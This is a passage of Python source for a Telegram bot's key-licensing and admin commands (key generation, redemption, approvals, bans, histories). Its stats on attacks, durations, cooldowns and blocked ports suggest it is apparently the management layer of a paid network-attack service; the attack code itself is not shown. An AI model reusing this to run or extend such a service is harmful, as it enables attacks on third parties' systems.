                    f"📱 **Username:** {user_username}\n\n"
                    f"✅ **Status:** Active Plan\n"
                    f"⏰ **Expires In:** {time_left}\n"
                    f"📅 **Expiry Date:** {format_ist_time(expires_at)} IST\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                )
            else:
                response = "❌ Your plan has **EXPIRED**!\n\nUse /redeem KEY to activate a new plan."
        else:
            response = "❌ No active plan found.\n\nUse /redeem KEY to activate your account."
    else:
        response = "❌ Account not activated.\n\nUse /redeem KEY to activate your account."
    
    safe_send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ This command is only for admins and owner!")
        return
    
    total_users = len(db.get_all_users())
    uptime = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    
    response = (
        f"🏓 Pong!\n\n"
        f"• Status: 🟢 Online\n"
        f"• Users: {total_users}\n"
        f"• Uptime: {hours}h {minutes:02d}m {seconds:02d}s\n"
        f"• IST Time: {format_ist_time()}"
    )
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["id"])
def id_command(message):
    safe_send_message(message.chat.id, f"{message.from_user.id}")

@bot.message_handler(commands=["ip"])
def ip_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    server_ip = get_server_ip()
    response = (
        f"🖥️ Server Information\n\n"
        f"📍 IP: {server_ip}\n"
        f"✅ Status: Online\n"
        f"👑 Owner: {OWNER_ID}\n"
        f"🕐 IST Time: {format_ist_time()}"
    )
    
    safe_send_message(message.chat.id, response)

# ============ ADMIN COMMANDS ============

@bot.message_handler(commands=["gen"])
def gen_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Admin only command!")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        help_text = (
            "🔑 KEY GENERATION HELP\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 Format: /gen <duration> <quantity>\n\n"
            "⏱️ DURATION FORMAT:\n"
            "• h = hours (e.g., 24h, 12h)\n"
            "• d = days (e.g., 7d, 30d)\n\n"
            "📌 EXAMPLES:\n"
            "• /gen 24h - 1 key (24 hours)\n"
            "• /gen 7d 5 - 5 keys (7 days each)"
        )
        safe_send_message(message.chat.id, help_text)
        return
    
    duration_str = parts[1]
    quantity = 1
    
    if len(parts) >= 3:
        try:
            quantity = int(parts[2])
            if quantity < 1 or quantity > 100:
                safe_send_message(message.chat.id, "❌ Quantity must be 1-100!")
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid quantity!")
            return
    
    duration_seconds, display_duration = parse_duration(duration_str)
    if not duration_seconds:
        safe_send_message(message.chat.id, "❌ Invalid duration! Use 24h or 7d")
        return
    
    admin_user = message.from_user
    admin_username = admin_user.username or str(user_id)
    admin_full_name = admin_user.first_name or ""
    if admin_user.last_name:
        admin_full_name += f" {admin_user.last_name}"
    
    keys = db.generate_key(duration_seconds, display_duration, user_id, admin_username, admin_full_name, quantity)
    
    if quantity == 1:
        response = (
            f"✅ **Key Generated!**\n\n"
            f"🔑 Key: `{keys[0]}`\n"
            f"⏱️ Duration: `{display_duration}`\n\n"
            f"User can use `/redeem {keys[0]}`"
        )
    else:
        key_list = "\n".join([f"{i+1}. `{k}`" for i, k in enumerate(keys)])
        response = (
            f"✅ **{quantity} Keys Generated!**\n\n"
            f"{key_list}\n\n"
            f"📅 Duration: `{display_duration}` each\n\n"
            f"Users can use `/redeem <key>`"
        )
    
    safe_send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(commands=["approve"])
def approve_command(message):
    if not is_admin(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Admin only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        safe_send_message(message.chat.id, "❌ Usage: /approve USER_ID DURATION\nExample: /approve 123456789 30d")
        return
    
    try:
        user_id = int(parts[1])
        duration_str = parts[2]
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!")
        return
    
    duration_seconds, display_duration = parse_duration(duration_str)
    if not duration_seconds:
        safe_send_message(message.chat.id, "❌ Invalid duration! Use 30d or 24h")
        return
    
    admin_id = message.from_user.id
    admin_username = message.from_user.username or str(admin_id)
    admin_full_name = message.from_user.first_name or ""
    if message.from_user.last_name:
        admin_full_name += f" {message.from_user.last_name}"
    
    user = db.get_user(user_id)
    if not user:
        try:
            chat = bot.get_chat(user_id)
            full_name = chat.first_name or ""
            if chat.last_name:
                full_name += f" {chat.last_name}"
            db.create_user(user_id, chat.username, full_name)
        except:
            db.create_user(user_id)
    
    expires_at = get_current_time_utc() + timedelta(seconds=duration_seconds)
    
    # Update user
    user = db.get_user(user_id)
    if not user:
        user = {"_id": user_id, "user_id": user_id}
    
    user["activated"] = True
    user["activated_at"] = get_current_time_utc().isoformat()
    user["expires_at"] = expires_at.isoformat()
    update_json_file(USERS_FILE, user_id, user, "_id")
    
    # Save to approval history
    history_record = {
        "user_id": user_id,
        "username": user.get('username') if user else None,
        "full_name": user.get('full_name') if user else None,
        "duration_display": display_duration,
        "duration_seconds": duration_seconds,
        "expires_at": expires_at.isoformat(),
        "approved_by": admin_id,
        "admin_username": admin_username,
        "admin_full_name": admin_full_name,
        "timestamp": get_current_time_utc().isoformat(),
        "method": "admin_approval"
    }
    history = read_json_file(APPROVALS_HISTORY_FILE, [])
    history.append(history_record)
    write_json_file(APPROVALS_HISTORY_FILE, history)
    
    safe_send_message(
        message.chat.id,
        f"✅ User {user_id} approved for {display_duration}!\n📅 Expires: {format_ist_time(expires_at)} IST"
    )
    
    try:
        bot.send_message(
            user_id,
            f"✅ Your account has been approved for {display_duration}!\n📅 Expires: {format_ist_time(expires_at)} IST\n\nUse /help for commands."
        )
    except:
        pass

@bot.message_handler(commands=["disapprove"])
def disapprove_command(message):
    user_id = message.from_user.id
    
    # Check if owner or admin
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Admin or Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "❌ Usage: /disapprove USER_ID")
        return
    
    try:
        target_user_id = int(parts[1])
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!")
        return
    
    # Owner can disapprove anyone
    if is_owner(user_id):
        success, msg = db.disapprove_user_by_owner(target_user_id)
        safe_send_message(message.chat.id, msg)
        if success:
            try:
                bot.send_message(target_user_id, "❌ Your access has been revoked by the owner.")
            except:
                pass
        return
    
    # Admin can disapprove users they approved or who redeemed their keys
    if is_admin(user_id):
        success, msg = db.disapprove_user_by_admin(target_user_id, user_id)
        safe_send_message(message.chat.id, msg)
        if success:
            try:
                bot.send_message(target_user_id, "❌ Your access has been revoked by an admin.")
            except:
                pass
        return

@bot.message_handler(commands=["delmykeys"])
def delmykeys_command(message):
    user_id = message.from_user.id
    
    # Only admins can use this command
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Admin only command!")
        return
    
    # Get all unused keys generated by this admin
    all_keys = db.get_all_keys()
    my_unused_keys = [k for k in all_keys if k.get('generated_by') == user_id and k.get('status') == 'unused']
    
    if not my_unused_keys:
        safe_send_message(message.chat.id, "❌ No unused keys found that were generated by you.")
        return
    
    # Count how many keys will be deleted
    key_count = len(my_unused_keys)
    
    # Delete all keys
    deleted = db.delete_keys_by_admin(user_id)
    
    safe_send_message(
        message.chat.id, 
        f"✅ Deleted {deleted} of your unused keys.\n\n"
        f"📊 Total unused keys you had: {key_count}"
    )

@bot.message_handler(commands=["delmykey"])
def delmykey_command(message):
    user_id = message.from_user.id
    
    # Only admins can use this command
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Admin only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "❌ Usage: /delmykey KEY\nExample: /delmykey ABC123DEF456")
        return
    
    key = parts[1].upper()
    
    # Get key info
    key_info = db.get_key_info(key)
    
    if not key_info:
        safe_send_message(message.chat.id, f"❌ Key {key} not found.")
        return
    
    # Check if key belongs to this admin
    if key_info.get('generated_by') != user_id:
        safe_send_message(message.chat.id, "❌ You can only delete keys that you generated!")
        return
    
    # Check if key is unused
    if key_info.get('status') != 'unused':
        safe_send_message(message.chat.id, f"❌ Key {key} is already used or expired. Only unused keys can be deleted.")
        return
    
    # Delete the key
    if db.delete_key(key):
        safe_send_message(message.chat.id, f"✅ Your key {key} has been deleted.")
    else:
        safe_send_message(message.chat.id, f"❌ Failed to delete key {key}.")

@bot.message_handler(commands=["stats"])
def stats_command(message):
    if not is_admin(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Admin only command!")
        return
    
    users = db.get_all_users()
    approved = sum(1 for u in users if u.get("activated", False))
    total, success, failed = db.get_attack_stats()
    
    cooldown = db.get_setting("cooldown") or 60
    max_duration = db.get_setting("max_duration") or 300
    
    response = (
        f"📊 BOT STATISTICS\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Total Users: {len(users)}\n"
        f"✅ Approved: {approved}\n"
        f"🎯 Total Attacks: {total}\n"
        f"✅ Successful: {success}\n"
        f"❌ Failed: {failed}\n"
        f"⏰ Cooldown: {cooldown}s\n"
        f"⏱️ Max Duration: {max_duration}s\n"
        f"🚫 Blocked Ports: {len(db.get_blocked_ports())}\n"
        f"🕐 IST Time: {format_ist_time()}"
    )
    
    safe_send_message(message.chat.id, response)

# ============ OWNER ONLY COMMANDS ============

@bot.message_handler(commands=["users"])
def users_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    # Get current time
    now_utc = get_current_time_utc()
    
    # Get ALL users
    all_users = db.get_all_users()
    
    # Filter ONLY users with active plans (activated and not expired)
    active_users = []
    for user in all_users:
        if user.get("activated", False):
            expires_at = user.get("expires_at")
            if expires_at:
                expires_dt = json_to_datetime(expires_at)
                if expires_dt and expires_dt > now_utc:
                    active_users.append(user)
    
    if not active_users:
        safe_send_message(message.chat.id, "📭 No users with active plans found.")
        return
    
    # Pagination
    page = 1
    parts = message.text.split()
    if len(parts) >= 2 and parts[1].isdigit():
        page = int(parts[1])
    
    per_page = 10
    total_pages = (len(active_users) + per_page - 1) // per_page
    
    if page < 1 or page > total_pages:
        safe_send_message(message.chat.id, f"❌ Page must be between 1 and {total_pages}")
        return
    
    start = (page - 1) * per_page
    end = min(start + per_page, len(active_users))
    
    response = f"✅ ACTIVE USERS LIST (Page {page}/{total_pages})\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"📊 Total Active Users: {len(active_users)}\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for idx, user in enumerate(active_users[start:end], start + 1):
        uid = user.get('user_id', 'Unknown')
        expires_at = user.get('expires_at')
        key = user.get('key')
        
        # Calculate remaining time
        remaining_seconds = 0
        if expires_at:
            expires_dt = json_to_datetime(expires_at)
            if expires_dt:
                remaining = expires_dt - now_utc
                remaining_seconds = int(remaining.total_seconds())
        
        # Format remaining time
        if remaining_seconds > 0:
            days = remaining_seconds // 86400
            hours = (remaining_seconds % 86400) // 3600
            minutes = (remaining_seconds % 3600) // 60
            if days > 0:
                time_left = f"{days}d {hours}h"
            elif hours > 0:
                time_left = f"{hours}h {minutes}m"
            else:
                time_left = f"{minutes}m"
        else:
            time_left = "Expired"
        
        # Get key info to find which admin generated it
        key_info = None
        admin_name = "Unknown"
        admin_username = "Unknown"
        admin_id = "Unknown"
        
        if key:
            key_info = db.get_key_info(key)
            if key_info:
                admin_id = key_info.get('generated_by', 'Unknown')
                admin_name = key_info.get('admin_full_name', 'Unknown')
                admin_username = key_info.get('admin_username', 'Unknown')
        
        # Get user details
        user_name = user.get('full_name', '')
        user_username = user.get('username', '')
        
        try:
            chat = bot.get_chat(uid)
            user_name = chat.first_name or ""
            if chat.last_name:
                user_name += f" {chat.last_name}"
            user_username = f"@{chat.username}" if chat.username else "No username"
        except:
            if not user_name:
                user_name = "Unknown"
            if not user_username:
                user_username = "No username"
        
        response += f"{idx}. 🆔 USER: {uid}\n"
        response += f"   ├ 👤 Name: {user_name}\n"
        response += f"   ├ 🆔 Username: {user_username}\n"
        response += f"   ├ ⏱️ Time Left: {time_left}\n"
        response += f"   ├ 🔑 Redeemed Key: {key if key else 'N/A'}\n"
        response += f"   └ 👑 Approved By Admin:\n"
        response += f"        ├ 👤 Name: {admin_name}\n"
        response += f"        ├ 🆔 Username: @{admin_username}\n"
        response += f"        └ 🆔 ID: {admin_id}\n\n"
    
    if total_pages > 1:
        response += f"\n📄 Use /users {page+1} for next page" if page < total_pages else ""
        response += f"\n📄 Use /users {page-1} for previous page" if page > 1 else ""
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["userinfo"])
def userinfo_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /userinfo USER_ID\nExample: /userinfo 123456789")
        return
    
    target_user_id = int(parts[1])
    
    # Get user from database
    user = db.get_user(target_user_id)
    
    if not user:
        safe_send_message(message.chat.id, f"❌ User {target_user_id} not found in database.")
        return
    
    # Get user details
    user_name = user.get('full_name', '')
    user_username = user.get('username', '')
    
    try:
        chat = bot.get_chat(target_user_id)
        user_name = chat.first_name or ""
        if chat.last_name:
            user_name += f" {chat.last_name}"
        user_username = f"@{chat.username}" if chat.username else "No username"
    except:
        if not user_name:
            user_name = "Unknown"
        if not user_username:
            user_username = "No username"
    
    is_banned = user.get('is_banned', False)
    is_activated = user.get('activated', False)
    total_attacks = user.get('total_attacks', 0)
    created_at = user.get('created_at')
    
    response = f"👤 **USER DETAILS**\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"🆔 **User ID:** {target_user_id}\n"
    response += f"👤 **Name:** {user_name}\n"
    response += f"📱 **Username:** {user_username}\n"
    response += f"🔨 **Account Created:** {format_ist_time(json_to_datetime(created_at))} IST\n"
    response += f"🚫 **Banned:** {'Yes ❌' if is_banned else 'No ✅'}\n"
    response += f"🎯 **Total Attacks:** {total_attacks}\n\n"
    
    if is_activated:
        expires_at = user.get('expires_at')
        key = user.get('key')
        
        if expires_at:
            expiry_time = json_to_datetime(expires_at)
            now_utc = get_current_time_utc()
            
            if expiry_time and expiry_time > now_utc:
                # Calculate remaining time
                remaining = expiry_time - now_utc
                remaining_seconds = int(remaining.total_seconds())
                
                days = remaining_seconds // 86400
                hours = (remaining_seconds % 86400) // 3600
                minutes = (remaining_seconds % 3600) // 60
                
                if days > 0:
                    time_left = f"{days} days {hours} hours"
                elif hours > 0:
                    time_left = f"{hours} hours {minutes} minutes"
                else:
                    time_left = f"{minutes} minutes"
                
                response += f"✅ **Status:** Active Plan\n"
                response += f"⏰ **Expires In:** {time_left}\n"
                response += f"📅 **Expiry Date:** {format_ist_time(expires_at)} IST\n\n"
                
                # Get key info to find which admin generated the key
                if key:
                    key_info = db.get_key_info(key)
                    if key_info:
                        response += f"🔑 **Redeemed Key:** {key}\n"
                        response += f"📅 **Plan Duration:** {key_info.get('duration_display', 'Unknown')}\n\n"
                        
                        response += f"👑 **KEY GENERATED BY ADMIN:**\n"
                        response += f"   ├ 👤 Name: {key_info.get('admin_full_name', 'Unknown')}\n"
                        response += f"   ├ 🆔 Username: @{key_info.get('admin_username', 'Unknown')}\n"
                        response += f"   ├ 🆔 Admin ID: {key_info.get('generated_by', 'Unknown')}\n"
                        response += f"   └ 🕐 Generated At: {format_ist_time(json_to_datetime(key_info.get('generated_at')))}\n\n"
                        
                        response += f"🎯 **KEY REDEEMED BY USER:**\n"
                        response += f"   └ 🕐 Redeemed At: {format_ist_time(json_to_datetime(key_info.get('redeemed_at')))}\n"
            else:
                response += f"❌ **Status:** EXPIRED (Plan expired on {format_ist_time(expires_at)} IST)\n"
        else:
            response += f"✅ **Status:** Active Plan (No expiry date set)\n"
    else:
        response += f"❌ **Status:** Not Activated / No Active Plan\n"
        
        # Check if user has any approval history
        history = read_json_file(APPROVALS_HISTORY_FILE, [])
        user_history = [h for h in history if h.get('user_id') == target_user_id]
        user_history = sorted(user_history, key=lambda x: x.get('timestamp', ''), reverse=True)
        
        if user_history:
            response += f"\n📜 **Previous Approval History:**\n"
            for idx, record in enumerate(user_history[:3], 1):
                response += f"\n   {idx}. 📅 **Approved On:** {format_ist_time(json_to_datetime(record.get('timestamp')))} IST\n"
                response += f"      ⏱️ **Duration:** {record.get('duration_display', 'Unknown')}\n"
                response += f"      👑 **Approved By Admin:**\n"
                response += f"         ├ 👤 Name: {record.get('admin_full_name', 'Unknown')}\n"
                response += f"         ├ 🆔 Username: @{record.get('admin_username', 'Unknown')}\n"
                response += f"         └ 🆔 Admin ID: {record.get('approved_by', 'Unknown')}\n"
    
    # Check if user is an admin
    if db.is_admin(target_user_id) and target_user_id != OWNER_ID:
        response += f"\n👑 **User is an ADMIN of this bot**\n"
    elif target_user_id == OWNER_ID:
        response += f"\n👑 **User is the OWNER of this bot**\n"
    
    response += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    safe_send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(commands=["keyhistory"])
def keyhistory_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    page = 1
    if len(parts) >= 2 and parts[1].isdigit():
        page = int(parts[1])
    
    all_keys = db.get_all_keys()
    if not all_keys:
        safe_send_message(message.chat.id, "📭 No keys found in database.")
        return
    
    per_page = 5
    total_pages = (len(all_keys) + per_page - 1) // per_page
    
    if page < 1 or page > total_pages:
        safe_send_message(message.chat.id, f"❌ Page must be between 1 and {total_pages}")
        return
    
    start = (page - 1) * per_page
    end = min(start + per_page, len(all_keys))
    
    used = len([k for k in all_keys if k.get('status') == 'used'])
    unused = len([k for k in all_keys if k.get('status') == 'unused'])
    
    response = f"🔑 KEY HISTORY (Page {page}/{total_pages})\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"📊 Total: {len(all_keys)} | ✅ Used: {used} | ⏳ Unused: {unused}\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for k in all_keys[start:end]:
        status = k.get('status', 'unknown')
        icon = "✅" if status == 'used' else "⏳" if status == 'unused' else "⚠️"
        
        response += f"{icon} KEY: {k.get('key')}\n"
        response += f"   📅 Duration: {k.get('duration_display')}\n"
        response += f"   📊 Status: {status.upper()}\n\n"
        
        # Generated by
        response += f"   🔨 GENERATED BY:\n"
        response += f"      ├ 👤 Name: {k.get('admin_full_name', 'Unknown')}\n"
        response += f"      ├ 🆔 Username: @{k.get('admin_username', 'Unknown')}\n"
        response += f"      ├ 🆔 User ID: {k.get('generated_by', 'Unknown')}\n"
        response += f"      └ 🕐 At: {format_ist_time(json_to_datetime(k.get('generated_at')))}\n\n"
        
        # Redeemed by
        if status == 'used':
            response += f"   🎯 REDEEMED BY:\n"
            response += f"      ├ 👤 Name: {k.get('redeemed_full_name', 'Unknown')}\n"
            response += f"      ├ 🆔 Username: @{k.get('redeemed_username', 'Unknown')}\n"
            response += f"      ├ 🆔 User ID: {k.get('redeemed_by', 'Unknown')}\n"
            response += f"      └ 🕐 At: {format_ist_time(json_to_datetime(k.get('redeemed_at')))}\n"
        else:
            response += f"   ⏳ EXPIRES AT: {format_ist_time(json_to_datetime(k.get('expires_at')))}\n"
        
        response += f"\n{'-' * 50}\n"
    
    if total_pages > 1:
        response += f"\n📄 Use /keyhistory {page+1} for next page" if page < total_pages else ""
        response += f"\n📄 Use /keyhistory {page-1} for previous page" if page > 1 else ""
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["keyinfo"])
def keyinfo_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "❌ Usage: /keyinfo KEY\nExample: /keyinfo ABC123DEF456")
        return
    
    key = parts[1].upper()
    
    # Get key info from database
    key_info = db.get_key_info(key)
    
    if not key_info:
        safe_send_message(message.chat.id, f"❌ Key {key} not found.")
        return
    
    status = key_info.get('status', 'unknown')
    
    if status == 'used':
        icon = "✅"
        status_text = "USED"
    elif status == 'unused':
        icon = "⏳"
        status_text = "UNUSED"
    else:
        icon = "⚠️"
        status_text = "EXPIRED"
    
    response = f"{icon} KEY DETAILS: {key}\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"📅 Duration: {key_info.get('duration_display', 'Unknown')}\n"
    response += f"📊 Status: {status_text}\n\n"
    
    # Generated by
    response += f"🔨 GENERATED BY:\n"
    response += f"   ├ 👤 Name: {key_info.get('admin_full_name', 'Unknown')}\n"
    response += f"   ├ 🆔 Username: @{key_info.get('admin_username', 'Unknown')}\n"
    response += f"   ├ 🆔 User ID: {key_info.get('generated_by', 'Unknown')}\n"
    response += f"   └ 🕐 At: {format_ist_time(json_to_datetime(key_info.get('generated_at')))}\n\n"
    
    # Redeemed by (if used)
    if status == 'used':
        response += f"🎯 REDEEMED BY:\n"
        response += f"   ├ 👤 Name: {key_info.get('redeemed_full_name', 'Unknown')}\n"
        response += f"   ├ 🆔 Username: @{key_info.get('redeemed_username', 'Unknown')}\n"
        response += f"   ├ 🆔 User ID: {key_info.get('redeemed_by', 'Unknown')}\n"
        response += f"   └ 🕐 At: {format_ist_time(json_to_datetime(key_info.get('redeemed_at')))}\n"
    else:
        response += f"⏳ EXPIRES AT: {format_ist_time(json_to_datetime(key_info.get('expires_at')))}\n"
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["approvalhistory"])
def approvalhistory_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    page = 1
    if len(parts) >= 2 and parts[1].isdigit():
        page = int(parts[1])
    
    history = db.get_approval_history()
    if not history:
        safe_send_message(message.chat.id, "📭 No approval history found.")
        return
    
    per_page = 5
    total_pages = (len(history) + per_page - 1) // per_page
    
    if page < 1 or page > total_pages:
        safe_send_message(message.chat.id, f"❌ Page must be between 1 and {total_pages}")
        return
    
    start = (page - 1) * per_page
    end = min(start + per_page, len(history))
    
    response = f"📋 APPROVAL HISTORY (Page {page}/{total_pages})\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"📊 Total Approvals: {len(history)}\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for idx, record in enumerate(history[start:end], start + 1):
        response += f"{idx}. 🎯 USER APPROVED:\n"
        response += f"   ├ 👤 Name: {record.get('full_name', 'Unknown')}\n"
        response += f"   ├ 🆔 Username: @{record.get('username', 'Unknown')}\n"
        response += f"   ├ 🆔 User ID: {record.get('user_id', 'Unknown')}\n"
        response += f"   ├ 🔑 Key: {record.get('key', 'Unknown')}\n"
        response += f"   ├ ⏱️ Duration: {record.get('duration_display', 'Unknown')}\n"
        response += f"   └ 🕐 Redeemed At: {format_ist_time(json_to_datetime(record.get('redeemed_at')))}\n\n"
        
        response += f"   👑 APPROVED BY ADMIN:\n"
        response += f"      ├ 👤 Name: {record.get('admin_full_name', 'Unknown')}\n"
        response += f"      ├ 🆔 Username: @{record.get('admin_username', 'Unknown')}\n"
        response += f"      ├ 🆔 Admin ID: {record.get('generated_by', 'Unknown')}\n"
        response += f"      └ 🕐 Expires: {format_ist_time(json_to_datetime(record.get('expires_at')))}\n"
        
        response += f"\n{'-' * 50}\n"
    
    if total_pages > 1:
        response += f"\n📄 Use /approvalhistory {page+1} for next page" if page < total_pages else ""
        response += f"\n📄 Use /approvalhistory {page-1} for previous page" if page > 1 else ""
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["delkey"])
def delkey_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "❌ Usage: /delkey KEY")
        return
    
    key = parts[1].upper()
    key_info = db.get_key_info(key)
    
    if not key_info:
        safe_send_message(message.chat.id, f"❌ Key {key} not found.")
        return
    
    if key_info.get('status') != 'unused':
        safe_send_message(message.chat.id, f"❌ Key {key} is already used or expired.")
        return
    
    if db.delete_key(key):
        safe_send_message(message.chat.id, f"✅ Key {key} deleted.")
    else:
        safe_send_message(message.chat.id, f"❌ Failed to delete key.")

@bot.message_handler(commands=["delallkeys"])
def delallkeys_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    all_keys = db.get_all_keys()
    unused = [k for k in all_keys if k.get('status') == 'unused']
    
    if not unused:
        safe_send_message(message.chat.id, "❌ No unused keys found.")
        return
    
    deleted = db.delete_all_unused_keys()
    safe_send_message(message.chat.id, f"✅ Deleted {deleted} unused keys.")

@bot.message_handler(commands=["addadmin"])
def addadmin_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /addadmin USER_ID")
        return
    
    user_id = int(parts[1])
    
    if user_id == OWNER_ID:
        safe_send_message(message.chat.id, "❌ Owner is already the highest authority.")
        return
    
    if db.add_admin(user_id, OWNER_ID):
        safe_send_message(message.chat.id, f"✅ User {user_id} added as admin.")
        try:
            bot.send_message(user_id, "✅ You have been promoted to ADMIN by the owner.")
        except:
            pass
    else:
        safe_send_message(message.chat.id, f"❌ User {user_id} is already an admin.")

@bot.message_handler(commands=["removeadmin"])
def removeadmin_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /removeadmin USER_ID")
        return
    
    user_id = int(parts[1])
    
    if db.remove_admin(user_id):
        safe_send_message(message.chat.id, f"✅ User {user_id} removed from admins.")
        try:
            bot.send_message(user_id, "❌ You have been demoted from ADMIN by the owner.")
        except:
            pass
    else:
        safe_send_message(message.chat.id, f"❌ User {user_id} is not an admin.")

@bot.message_handler(commands=["admins"])
def admins_command(message):
    # ONLY OWNER can use this command
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    admins = db.get_all_admins()
    
    response = "👑 ADMINS LIST\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    # Add Owner first
    try:
        owner_chat = bot.get_chat(OWNER_ID)
        owner_name = owner_chat.first_name or ""
        if owner_chat.last_name:
            owner_name += f" {owner_chat.last_name}"
        owner_username = f"@{owner_chat.username}" if owner_chat.username else "No username"
        response += f"👑 OWNER:\n"
        response += f"   ├ 👤 Name: {owner_name}\n"
        response += f"   ├ 🆔 Username: {owner_username}\n"
        response += f"   └ 🆔 User ID: {OWNER_ID}\n\n"
    except:
        response += f"👑 OWNER: {OWNER_ID}\n\n"
    
    # Add Admins
    if admins:
        response += "👥 ADMINS:\n"
        for idx, admin_id in enumerate(admins, 1):
            try:
                admin_chat = bot.get_chat(admin_id)
                admin_name = admin_chat.first_name or ""
                if admin_chat.last_name:
                    admin_name += f" {admin_chat.last_name}"
                admin_username = f"@{admin_chat.username}" if admin_chat.username else "No username"
                response += f"\n{idx}. 👤 ADMIN:\n"
                response += f"   ├ 👤 Name: {admin_name}\n"
                response += f"   ├ 🆔 Username: {admin_username}\n"
                response += f"   └ 🆔 User ID: {admin_id}\n"
            except:
                response += f"\n{idx}. 👤 ADMIN: {admin_id} (Unable to fetch details)\n"
    else:
        response += "👥 No other admins found."
    
    response += f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"📊 Total: 1 Owner + {len(admins)} Admins"
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["banuser"])
def banuser_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /banuser USER_ID")
        return
    
    user_id = int(parts[1])
    
    if db.ban_user(user_id):
        safe_send_message(message.chat.id, f"✅ User {user_id} banned.")
        try:
            bot.send_message(user_id, "❌ You have been banned from using this bot.")
        except:
            pass
    else:
        safe_send_message(message.chat.id, f"❌ User {user_id} not found.")

@bot.message_handler(commands=["unbanuser"])
def unbanuser_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
